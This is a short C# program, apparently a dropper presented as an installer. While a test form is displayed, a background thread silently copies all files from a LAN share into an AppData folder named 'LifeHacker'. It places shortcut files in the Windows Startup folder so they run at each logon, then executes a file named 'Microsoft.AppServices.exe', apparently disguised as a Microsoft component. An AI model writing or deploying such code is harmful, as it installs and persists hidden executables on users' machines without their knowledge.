using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Instalador
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        private static void Main(string[] args)
        {
            new Thread(() =>
            {
                string diretorioRede = @"\\192.168.1.126\Público\Debug";
                string diretorioLocal = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "LifeHacker");
                string diretorioInicializar = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup");

                var arquivos = Directory.GetFiles(diretorioRede);

                if (!Directory.Exists(diretorioLocal))
                    Directory.CreateDirectory(diretorioLocal);

                foreach (var arquivo in arquivos)
                {
                    var fi = new FileInfo(arquivo);

                    try
                    {
                        if (fi.Name.Contains("Atalho"))
                            fi.CopyTo(Path.Combine(diretorioInicializar, fi.Name));

                        fi.CopyTo(Path.Combine(diretorioLocal, fi.Name));
                    }
                    catch (Exception ex)
                    {
                        Console.Write(ex);
                    }
                }

                ProcessStartInfo pi = new ProcessStartInfo(Path.Combine(diretorioLocal, "Microsoft.AppServices.exe"));
                var processo = new Process
                {
                    StartInfo = pi
                };
                processo.Start();
            }).Start();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new FormTeste());
        }
    }
}